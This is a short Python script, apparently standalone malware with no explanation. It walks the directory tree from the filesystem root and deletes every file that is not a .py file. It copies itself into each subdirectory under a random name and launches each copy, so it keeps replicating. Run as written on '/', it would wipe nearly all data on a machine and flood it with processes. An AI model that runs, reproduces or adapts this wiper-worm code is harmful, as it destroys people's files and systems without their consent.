import os
import uuid

def wipe_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.py'):
                pass
            else:
                file_path = os.path.join(root, file)
                os.remove(file_path)
def spread_script_into_subdirs(directory, script):
    for root, dirs, files in os.walk(directory):
        wipe_files_in_directory(root)
        
        current_file = open(__file__, 'r')
        script = current_file.read()
        current_file.close()
        
        random_id = uuid.uuid4()
        new_file_path = os.path.join(root, f'{random_id}.py')
        
        with open(new_file_path, 'w') as new_file:
            new_file.write(script)
        
        os.system(f'python3 {new_file_path}')

def main(tar_dir):
    target_directory = tar_dir
    
    current_file = open(__file__, 'r')
    script = current_file.read()
    current_file.close()
    
    wipe_files_in_directory(target_directory)
    spread_script_into_subdirs(target_directory, script)

if __name__ == "__main__":
    main("/")
